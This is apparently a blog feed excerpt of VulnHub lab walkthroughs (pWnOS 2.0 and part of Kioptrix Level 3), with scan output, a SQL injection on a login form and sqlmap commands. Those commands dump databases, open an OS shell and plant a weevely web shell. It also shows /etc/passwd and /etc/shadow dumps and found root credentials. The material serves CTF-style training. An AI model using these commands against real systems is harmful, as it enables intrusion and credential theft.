</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Got root!
</span><span class='line'>sh-4.0# id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>sh-4.0# cat /etc/shadow
</span><span class='line'>cat /etc/shadow
</span><span class='line'>root:<span class="nv">$6$4l1OVmLPSV28eVCT$FqycC5mozZ8mqiqgfudLsHUk7R1EMU</span>/FXw3pOcOb39LXekt9VY6HyGkXcLEO.ab9F9t7BqTdxSJvCcy.iYlcp0:14981:0:99999:7:::
</span><span class='line'>bin:*:14495:0:99999:7:::
</span><span class='line'>daemon:*:14495:0:99999:7:::
</span><span class='line'>adm:*:14495:0:99999:7:::
</span><span class='line'>lp:*:14495:0:99999:7:::
</span><span class='line'>sync:*:14495:0:99999:7:::
</span><span class='line'>shutdown:*:14495:0:99999:7:::
</span><span class='line'>halt:*:14495:0:99999:7:::
</span><span class='line'>mail:*:14495:0:99999:7:::
</span><span class='line'>uucp:*:14495:0:99999:7:::
</span><span class='line'>operator:*:14495:0:99999:7:::
</span><span class='line'>games:*:14495:0:99999:7:::
</span><span class='line'>gopher:*:14495:0:99999:7:::
</span><span class='line'>ftp:*:14495:0:99999:7:::
</span><span class='line'>nobody:*:14495:0:99999:7:::
</span><span class='line'>vcsa:!!:14557::::::
</span><span class='line'>avahi-autoipd:!!:14557::::::
</span><span class='line'>ntp:!!:14557::::::
</span><span class='line'>dbus:!!:14557::::::
</span><span class='line'>rtkit:!!:14557::::::
</span><span class='line'>nscd:!!:14557::::::
</span><span class='line'>tcpdump:!!:14557::::::
</span><span class='line'>avahi:!!:14557::::::
</span><span class='line'>haldaemon:!!:14557::::::
</span><span class='line'>openvpn:!!:14557::::::
</span><span class='line'>apache:!!:14557::::::
</span><span class='line'>saslauth:!!:14557::::::
</span><span class='line'>mailnull:!!:14557::::::
</span><span class='line'>smmsp:!!:14557::::::
</span><span class='line'>smolt:!!:14557::::::
</span><span class='line'>sshd:!!:14557::::::
</span><span class='line'>pulse:!!:14557::::::
</span><span class='line'>gdm:!!:14557::::::
</span><span class='line'>p0wnbox.Team:<span class="nv">$6$rPArLuwe8rM9Avwv$a5coOdUCQQY7NgvTnXaFj2D5SmggRrFsr6TP8g7IATVeEt37LUGJYvHM1myhelCyPkIjd8Yv5olMnUhwbQL76</span>/:14981:0:99999:7:::
</span><span class='line'>mysql:!!:14981::::::
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[pWnOS: 2.0]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/22/pwnos-2-dot-0/"/>
    <updated>2015-05-22T08:40:50+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/22/pwnos-2-dot-0</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/pwnos-20-pre-release,34/">pWnOS: 2.0 (Pre-Release)</a></p>

<p>Nmap output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap 10.10.10.100 -sV -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-27 14:45 CEST
</span><span class='line'>Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
</span><span class='line'>Service scan Timing: About 50.00% done; ETC: 14:45 (0:00:06 remaining)
</span><span class='line'>Nmap scan report for 10.10.10.100
</span><span class='line'>Host is up (0.00030s latency).
</span><span class='line'>Not shown: 65533 closed ports
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
</span><span class='line'>MAC Address: 00:0C:29:61:0D:EB (VMware)
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 7.54 seconds</span></code></pre></td></tr></table></div></figure>


<p>Nikto output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nikto -h 10.10.10.100
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          10.10.10.100
</span><span class='line'>+ Target Hostname:    10.10.10.100
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2015-04-27 14:46:59 (GMT2)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/2.2.17 (Ubuntu)
</span><span class='line'>+ Cookie PHPSESSID created without the httponly flag
</span><span class='line'>+ Retrieved x-powered-by header: PHP/5.3.5-1ubuntu7
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ Uncommon header 'tcn' found, with contents: list
</span><span class='line'>+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
</span><span class='line'>+ Apache/2.2.17 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
</span><span class='line'>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
</span><span class='line'>+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-3268: /includes/: Directory indexing found.
</span><span class='line'>+ OSVDB-3092: /includes/: This might be interesting...
</span><span class='line'>+ OSVDB-3092: /info/: This might be interesting...
</span><span class='line'>+ OSVDB-3092: /login/: This might be interesting...
</span><span class='line'>+ OSVDB-3092: /register/: This might be interesting...
</span><span class='line'>+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /icons/README, inode: 1311031, size: 5108, mtime: Tue Aug 28 12:48:10 2007
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
</span><span class='line'>+ /login.php: Admin login page/section found.
</span><span class='line'>+ 7331 requests: 0 error(s) and 22 item(s) reported on remote host
</span><span class='line'>+ End Time:           2015-04-27 14:47:09 (GMT2) (10 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>


<p>There is a SQL injection in email, we can see an error message trying to log in (filling an email field with the single quote):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://10.10.10.100/login.php:
</span><span class='line'>
</span><span class='line'>An error occurred in script '/var/www/login.php' on line 47: Query: SELECT *
</span><span class='line'>FROM users WHERE email=''' AND pass='86f7e437faa5a7fce15d1ddcb9eaeaea377667b8'
</span><span class='line'>AND active IS NULL 
</span><span class='line'>
</span><span class='line'>MySQL Error: You have an error in your SQL syntax; check the
</span><span class='line'>manual that corresponds to your MySQL server version for the right syntax to
</span><span class='line'>use near '86f7e437faa5a7fce15d1ddcb9eaeaea377667b8' AND active IS NULL' at line 1</span></code></pre></td></tr></table></div></figure>


<p>Using Sqlmap we dump the whole databases:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ sqlmap -u "http://10.10.10.100/login.php" --forms --dump-all
</span><span class='line'>[ .. snip .. ]
</span><span class='line'>email=test@test.com&pass=123&submit=Login&submitted=TRUE</span></code></pre></td></tr></table></div></figure>


<p>We try to crack hashes but without success in the reasonable time:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/10.10.10.100/dump# cat mysql/user-f3649c95.csv | cut -d, -f2-3 | sed 's#,#:#' > /tmp/hashes.csv
</span><span class='line'>root@kali32:~/.sqlmap/output/10.10.10.100/dump# john --format=mysql-sha1 /tmp/hashes.csv 
</span><span class='line'>[ .. snip .. ]
</span><span class='line'>root@kali32:~/.sqlmap/output/10.10.10.100/dump# cat ch16/users.csv 
</span><span class='line'>user_id,pass,email,active,last_name,first_name,user_level,registration_date
</span><span class='line'>1,c2c4b4e51d9e23c02c15702c136c3e950ba9a4af,admin@isints.com,NULL,Privett,Dan,0,2011-05-07 17:27:01</span></code></pre></td></tr></table></div></figure>


<p>With OS Shell functionality of Sqlmap (&ndash;os-shell), we was able to obtain shell with the web user privileges:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>os-shell> cat /etc/passwd
</span><span class='line'>do you want to retrieve the command standard output? [Y/n/a] y
</span><span class='line'>command standard output:
</span><span class='line'>---
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>syslog:x:101:103::/home/syslog:/bin/false
</span><span class='line'>mysql:x:0:0:MySQL Server,,,:/root:/bin/bash
</span><span class='line'>sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>landscape:x:104:110::/var/lib/landscape:/bin/false
</span><span class='line'>dan:x:1000:1000:Dan Privett,,,:/home/dan:/bin/bash</span></code></pre></td></tr></table></div></figure>


<p>As we can see, MySQL daemon is running as root (=uid 0), this is also the
reason, why we were able to write something with database user to /var/www
(owned by www-data), that&rsquo;s not common.</p>

<p>We can also upload weevely to the remote system and use it as the more sophisticated shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# sqlmap -u "http://10.10.10.100/login.php" --data "email=test@test.com&pass=123&submit=Login&submitted=TRUE" --file-write="/var/www/weevely.php.txt" --file-dest=/var/www/w.php</span></code></pre></td></tr></table></div></figure>


<p>We found the database credentials, however they didn&rsquo;t work:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">web</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span> <span class="err">$</span> <span class="nx">cat</span> <span class="nb">mysqli_connect</span><span class="o">.</span><span class="nx">php</span>
</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="c1"># Script 8.2 - mysqli_connect.php</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// This file contains the database access information.</span>
</span><span class='line'><span class="c1">// This file also establishes a connection to MySQL</span>
</span><span class='line'><span class="c1">// and selects the database.</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Set the database access information as constants:</span>
</span><span class='line'>
</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="s1">&#39;DB_USER&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">);</span>
</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="s1">&#39;DB_PASSWORD&#39;</span><span class="p">,</span> <span class="s1">&#39;goodday&#39;</span><span class="p">);</span>
</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="s1">&#39;DB_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span><span class="p">);</span>
</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="s1">&#39;DB_NAME&#39;</span><span class="p">,</span> <span class="s1">&#39;ch16&#39;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Make the connection:</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$dbc</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysqli_connect</span> <span class="p">(</span><span class="nx">DB_HOST</span><span class="p">,</span> <span class="nx">DB_USER</span><span class="p">,</span> <span class="nx">DB_PASSWORD</span><span class="p">,</span> <span class="nx">DB_NAME</span><span class="p">)</span> <span class="k">OR</span> <span class="k">die</span> <span class="p">(</span><span class="s1">&#39;Could not connect to MySQL: &#39;</span> <span class="o">.</span> <span class="nx">mysqli_connect_error</span><span class="p">()</span> <span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>That was strange, because the web application is connected. After a little more digging, we found this suspicious file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">web</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span> <span class="err">$</span> <span class="nx">cat</span> <span class="o">../</span><span class="nb">mysqli_connect</span><span class="o">.</span><span class="nx">php</span>
</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="c1"># Script 8.2 - mysqli_connect.php</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// This file contains the database access information.</span>
</span><span class='line'><span class="c1">// This file also establishes a connection to MySQL</span>
</span><span class='line'><span class="c1">// and selects the database.</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Set the database access information as constants:</span>
</span><span class='line'>
</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="s1">&#39;DB_USER&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">);</span>
</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="s1">&#39;DB_PASSWORD&#39;</span><span class="p">,</span> <span class="s1">&#39;root@ISIntS&#39;</span><span class="p">);</span>
</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="s1">&#39;DB_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span><span class="p">);</span>
</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="s1">&#39;DB_NAME&#39;</span><span class="p">,</span> <span class="s1">&#39;ch16&#39;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Make the connection:</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$dbc</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysqli_connect</span> <span class="p">(</span><span class="nx">DB_HOST</span><span class="p">,</span> <span class="nx">DB_USER</span><span class="p">,</span> <span class="nx">DB_PASSWORD</span><span class="p">,</span> <span class="nx">DB_NAME</span><span class="p">)</span> <span class="k">OR</span> <span class="k">die</span> <span class="p">(</span><span class="s1">&#39;Could not connect to MySQL: &#39;</span> <span class="o">.</span> <span class="nx">mysqli_connect_error</span><span class="p">()</span> <span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>The <a href="http://10.10.10.100/blog/index.php">blog application</a> uses the text files instead of MySQL. We were only
able to locate the password file, without cracking it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@web:/var/www $ cat blog/config/password.txt
</span><span class='line'>$1$weWj5iAZ$NU4CkeZ9jNtcP/qrPC69a/</span></code></pre></td></tr></table></div></figure>


<p>Using root / root@ISIntS we can finally log in via ssh as root:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@web:~# cat /etc/shadow 
</span><span class='line'>root:$6$aO1TGdyc$XfiMyap/.QYhjIip5xxrgpO1ydlo.DQXns3fYYLt1hiH4Fp0PJP4TMoDSg3wpAFklF03dV2cUDL04YcR9bSSI/:15101:0:99999:7:::
</span><span class='line'>daemon:*:15101:0:99999:7:::
</span><span class='line'>bin:*:15101:0:99999:7:::
</span><span class='line'>sys:*:15101:0:99999:7:::
</span><span class='line'>sync:*:15101:0:99999:7:::
</span><span class='line'>games:*:15101:0:99999:7:::
</span><span class='line'>man:*:15101:0:99999:7:::
</span><span class='line'>lp:*:15101:0:99999:7:::
</span><span class='line'>mail:*:15101:0:99999:7:::
</span><span class='line'>news:*:15101:0:99999:7:::
</span><span class='line'>uucp:*:15101:0:99999:7:::
</span><span class='line'>proxy:*:15101:0:99999:7:::
</span><span class='line'>www-data:*:15101:0:99999:7:::
</span><span class='line'>backup:*:15101:0:99999:7:::
</span><span class='line'>list:*:15101:0:99999:7:::
</span><span class='line'>irc:*:15101:0:99999:7:::
</span><span class='line'>gnats:*:15101:0:99999:7:::
</span><span class='line'>nobody:*:15101:0:99999:7:::
</span><span class='line'>libuuid:!:15101:0:99999:7:::
</span><span class='line'>syslog:*:15101:0:99999:7:::
</span><span class='line'>mysql:!:15101:0:99999:7:::
</span><span class='line'>sshd:*:15101:0:99999:7:::
</span><span class='line'>landscape:*:15101:0:99999:7:::
</span><span class='line'>dan:$6$Iu1ipXkP$F9Jdj7JNf56/UjrXgOTks3mqYO6J/ErWUtf.EWr2AT8lv6aHy3K6Ywjmd7HCUswgiEYDHMwq/aqwJToXl0ERs1:15101:0:99999:7:::</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kioptrix: Level 3]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/17/kioptrix-level-3/"/>
    <updated>2015-05-17T08:14:45+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/17/kioptrix-level-3</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">Kioptrix: Level 1.2 (#3)</a></p>

<p>DHCP client is running on the image and we got assigned this IP address:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ tail -n 5 /var/db/vmware/vmnet-dhcpd-vmnet8.leases
</span><span class='line'>lease 192.168.80.145 {
</span><span class='line'>  starts 0 2015/05/17 06:14:07;
</span><span class='line'>  ends 0 2015/05/17 06:44:07;
</span><span class='line'>  hardware ethernet 00:0c:29:d6:3b:13;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>We add to &lsquo;/etc/hosts&rsquo;:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.80.145 kioptrix3.com</span></code></pre></td></tr></table></div></figure>


<p>Nmap output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap kioptrix3.com -p- -sV
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-25 20:23 CEST
</span><span class='line'>Nmap scan report for kioptrix3.com (192.168.80.145)
</span><span class='line'>Host is up (0.00025s latency).
</span><span class='line'>Not shown: 65533 closed ports
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
</span><span class='line'>80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
</span><span class='line'>MAC Address: 00:0C:29:D6:3B:13 (VMware)
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 7.50 seconds</span></code></pre></td></tr></table></div></figure>


<p>Nikto output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb# nikto -h kioptrix3.com
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.80.145
</span><span class='line'>+ Target Hostname:    kioptrix3.com
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2015-04-25 20:44:13 (GMT2)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
</span><span class='line'>+ Cookie PHPSESSID created without the httponly flag
</span><span class='line'>+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ No CGI Directories found (use '-C all' to force check all possible dirs)
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 21:22:00 2009
</span><span class='line'>+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 5.4.26)
</span><span class='line'>+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
</span><span class='line'>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
</span><span class='line'>+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
</span><span class='line'>+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
